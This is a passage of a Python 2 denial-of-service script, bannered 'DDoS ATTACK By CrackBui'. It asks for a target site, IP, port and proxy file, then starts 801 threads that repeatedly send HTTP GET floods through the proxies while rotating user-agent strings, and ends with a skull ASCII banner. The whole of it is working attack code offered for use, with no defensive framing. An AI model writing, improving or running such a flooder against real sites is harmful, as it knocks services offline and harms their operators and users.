      "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
      "Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20110814 Firefox/6.0"
      "Feedfetcher-Google; (+http://www.google.com/feedfetcher.html;"
      "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6 (FlipboardProxy/1.1; "]



def generateip():
        notvalid = [10, 127, 169, 172, 192]
        first = randrange(1, 256)
        while first is notvalid:
            first = randrange(1, 256)
        _ip = ".".join([str(first), str(randrange(1, 256)),
        str(randrange(1, 256)), str(randrange(1, 256))])
        return _ip


def randomUserAgent():
    return random.choice(userAgents)





class BTB(threading.Thread):
    def run(self):
        current = x

        if current < len(listaproxy):
            proxy = listaproxy[current].split(':')
        else:
            proxy = random.choice(listaproxy).split(':')

        useragent = "User-Agent: " + randomUserAgent() + getUserAgent() + "\r\n"

        httprequest = get_host + useragent + accept + connection + "\r\n"

        while nload:
            time.sleep(0.5)

        while 1:
            try:
                a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                a.connect((proxy[0], int(proxy[1])))
                a.send(httprequest)
                try:
                    for i in xrange(999):
                        a.send(httprequest)
                except:
                    tts = 1


            except:
                proxy = random.choice(listaproxy).split(':')




# gioi thieu
print \
"""DDoS ATTACK By CrackBui"""
print '---------------------------------------------------'
# Site
url = raw_input("Trang Web: ")
host_url = url.replace("http://", "").replace("https://", "").split('/')[0]
#IP
ip = raw_input("IP Website: ")
port = input("Port: ")


size = input("Size: ")

#Proxy
in_file = open(raw_input("File proxy(proxy.txt): "),"r")
proxyf = in_file.read()
in_file.close()

listaproxy = proxyf.split('\n')



packets = input("Dame: ")


get_host = "GET " + url + " HTTP/1.1\r\nHost: " + host_url + "\r\n"
accept = "Accept-Encoding: gzip, deflate\r\n"


connection = "Connection: Keep-Alive, Persist\r\nProxy-Connection: keep-alive\r\n"



nload = 1


x = 0







for x in xrange(801):
    BTB().start()
    time.sleep(0.000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001)
    print "Power =  " + str(x) + "!"

print \
"""
                   ...
                 ;::::;
               ;::::; :;
             ;:::::'   :;
            ;:::::;     ;.
           ,:::::'       ;
           ::::::;       ;
           ;:::::;       ;          OOOOOOO
          ,;::::::;     ;'         / OOOOOOO
        ;:::::::::`. ,,,;.        /  / DOOOOOO
      .';:::::::::::::::::;,     /  /     DOOOO
     ,::::::;::::::;;;;::::;,   /  /        DOOO
    ;`::::::`'::::::;;;::::: ,#/  /          DOOO
    :`:::::::`;::::::;;::: ;::#  /            DOOO
    ::`:::::::`;:::::::: ;::::# /              DOO
    `:`:::::::`;:::::: ;::::::#/               DOO
     :::`:::::::`;; ;:::::::::##                OO
     ::::`:::::::`;::::::::;:::#                OO
     `:::::`::::::::::::;'`:;::#                O
      `:::::`::::::::;' /  / `:#
       ::::::`:::::;'  /  /   `#"""
nload = 0


while not nload:
    time.sleep(1)
